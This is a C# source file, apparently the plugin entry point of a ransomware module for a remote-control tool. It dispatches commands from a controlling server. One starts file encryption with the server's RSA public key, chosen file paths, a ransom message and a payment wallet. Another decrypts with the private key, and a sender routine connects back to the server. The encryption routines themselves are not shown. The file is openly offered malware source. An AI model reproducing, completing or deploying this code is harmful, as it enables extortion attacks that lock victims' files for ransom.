using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using Plugin.Operation;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.currentPacket.packetType)
            {

                case PacketType.RANSOMWARE_ENCRYPTION:
                    RansomwareEncryptionPacket ransomwareEncryptionPacket = (RansomwareEncryptionPacket)loadingAPI.currentPacket;
                    ActionEncryption encryption = new ActionEncryption(
                        ransomwareEncryptionPacket.publicRSAServerKey,
                        ransomwareEncryptionPacket.paths,
                        ransomwareEncryptionPacket.msg,
                        ransomwareEncryptionPacket.wallet,
                        loadingAPI
                        );
                    encryption.StartAction();
                    break;

                case PacketType.RANSOMWARE_DECRYPTION:
                    RansomwareDecryptionPacket ransomwareDecryptionPacket = (RansomwareDecryptionPacket)loadingAPI.currentPacket;
                    ActionDecryption decryption = new ActionDecryption(
                        ransomwareDecryptionPacket.privateRSAServerKey
                        );
                    decryption.StartAction(decryption.decryption.encryptedData);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }

        internal static void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);

            clientHandler.SendPacket(packet);
        }
    }
}
